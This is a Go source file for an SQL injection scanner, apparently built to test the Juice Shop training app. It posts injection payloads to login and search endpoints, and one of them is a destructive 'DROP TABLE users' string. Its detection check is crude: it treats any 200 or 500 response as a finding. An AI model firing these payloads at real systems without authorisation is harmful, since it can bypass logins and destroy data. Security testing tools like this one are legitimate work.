package scanner

import (
    "fmt"
    "time"
    "strings"
    "net/http"
    "net/url"
)

// SQLInjectionScanner implements the VulnerabilityScanner interface for detecting SQL Injection vulnerabilities.
type SQLInjectionScanner struct{}

// Scan performs the SQL Injection scan on the provided target and returns VulnerabilityDetails if detected.
func (s *SQLInjectionScanner) Scan(target string, headers map[string]string) (VulnerabilityDetails, bool) {
    vulnerableEndpoints := []string{
        target + "/login",      // Adjust based on Juice Shop endpoints
        target + "/search",     // For testing search input fields
    }

    payloads := []string{
        "' OR '1'='1",
        "' OR '1'='0'--",
        "'; DROP TABLE users--",
    }

    for _, endpoint := range vulnerableEndpoints {
        for _, payload := range payloads {
            // Simulate sending the payload via POST
            formData := url.Values{}
            formData.Set("username", payload)
            formData.Set("password", "password")

            req, err := http.NewRequest("POST", endpoint, strings.NewReader(formData.Encode()))
            if err != nil {
                fmt.Println("Error creating request:", err)
                continue
            }

            // Set the necessary headers
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            for key, value := range headers {
                req.Header.Add(key, value)
            }

            // Send the request
            resp, err := http.DefaultClient.Do(req)
            if err != nil {
                fmt.Printf("Error sending request with payload: %s Error: %s\n", payload, err)
                continue
            }

            defer resp.Body.Close()

            // Check the response
            if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusInternalServerError {
                fmt.Printf("SQL Injection vulnerability found at: %s with payload: %s\n", endpoint, payload)

                // Create the vulnerability details
                vulnerability := VulnerabilityDetails{
                    Type:       "SQL Injection",
                    Endpoint:   endpoint,
                    Payload:    payload,
                    DetectedAt: time.Now(),
                    Suggestion: "Sanitize and validate user inputs to prevent SQL Injection.",
                }

                // Add the vulnerability to the global list
                AddVulnerability(vulnerability)

                return vulnerability, true
            }
        }
    }

    return VulnerabilityDetails{}, false
}
